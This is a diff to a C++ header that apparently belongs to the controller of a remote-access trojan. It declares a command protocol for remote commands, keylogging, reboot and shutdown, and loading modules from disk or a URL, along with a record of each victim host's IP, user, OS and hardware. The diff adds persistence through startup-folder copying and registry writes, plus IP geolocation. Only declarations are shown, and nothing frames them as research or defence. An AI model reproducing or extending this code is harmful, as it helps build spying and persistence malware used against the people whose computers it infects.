@@ -1,5 +1,5 @@
 #pragma once
-#include "EventHandler.h"
+#include "MsgHandler.h"
 	
 
 #define KNEL	('K'|('N'<<8)|('E'<<16)|('L'<<24))
@@ -18,9 +18,13 @@
 #define KNEL_EDITCOMMENT	(0xee04)
 #define KNEL_EDITCOMMENT_OK	(0xee05)
 
-
 #define KNEL_UPLOAD_MODULE_FROMDISK		(0xee08)
 #define KNEL_UPLOAD_MODULE_FORMURL		(0xee09)
+
+
+
+#define KNEL_ERROR			(0xea08)
+
 
 #define KNEL_MODULE_BUSY				(0xdd00)
 #define KNEL_CMD						(0xdd01)
@@ -33,46 +37,69 @@
 #define KNEL_EXIT						(0xdd08)
 #define KNEL_KEYBD_LOG					(0xdd09)
 
-#define KNEL_GETMODULE		(0xea05)
-#define KNEL_MODULE			(0xea07)
+#define KNEL_UTILS_COPYTOSTARTUP		(0xdd0a)
+#define KNEL_UTILS_WRITE_REG			(0xdd0b)
 
 
+//获取模块信息....
+#define KNEL_GETMODULE_INFO	(0xea05)
+#define KNEL_MODULE_INFO	(0xea07)
+
+#define KNEL_MODULE_CHUNK_GET	(0xfa00)
+#define KNEL_MODULE_CHUNK_DAT	(0xfa01)
+
+
+class CUpModuleDlg;
 
 class CKernelSrv :
-	public CEventHandler
+	public CMsgHandler
 {
 public:
 	typedef struct LoginInfo
 	{
-		WCHAR szPrivateIP[128];				//
-		WCHAR szHostName[128];
-		WCHAR szUser[128];
-		WCHAR szOsName[128];
-		WCHAR szInstallDate[128];
-		WCHAR szCPU[128];
-		WCHAR szDisk_RAM[128];
+		TCHAR szPrivateIP[128];				//
+		TCHAR szHostName[128];
+		TCHAR szUser[128];
+		TCHAR szOsName[128];
+		TCHAR szInstallDate[128];
+		TCHAR szCPU[128];
+		TCHAR szDisk_RAM[128];
 		DWORD dwHasCamera;
 		DWORD dwPing;
-		WCHAR szComment[256];
+		TCHAR szComment[256];
 
 	}LoginInfo;
 	
 private:
+
 	HWND m_hClientList;
+	CUpModuleDlg*m_UpDlg;
+
+
 	void OnClose() ;	
-	void OnConnect();		
+	void OnOpen();		
 
 
-	void OnReadComplete(WORD Event, DWORD Total, DWORD nRead, char*Buffer);
+	void OnReadMsg(WORD Msg, DWORD dwSize, char*Buffer);
+	void OnWriteMsg(WORD Msg, DWORD dwSize, char*Buffer) {};
+
 
 	void OnLogin(LoginInfo *pLi);
-	void OnGetModule(const char*ModuleName);
+
+	CString getIPLocation(const CString & ip_address);
+	void OnGetModuleInfo(const char*ModuleName);
+	void OnGetModuleChunk(char * ChunkInfo);
+
+
 public:
+	CString GetLocation();;
+
 	void EditComment(WCHAR *Comment);
 	void Power_Reboot();
 	void Power_Shutdown();
 	void Restart();
 
+	void OnError(TCHAR * Error);
 	void UploadModuleFromDisk(WCHAR* Path);
 	void UploadModuleFromUrl(WCHAR* Url);
 
@@ -86,9 +113,10 @@ public:
 	void BeginExit();
 	void BeginKeyboardLog();
 
+	void UtilsWriteStartupReg();
+	void UtilsCopyToStartupMenu();
 	//----------------------------------------------
-	void OnModuleBusy();
-	CKernelSrv(HWND hClientList, DWORD Identity);
+	CKernelSrv(HWND hClientList, CManager*pManager);
 	~CKernelSrv();
 };
 
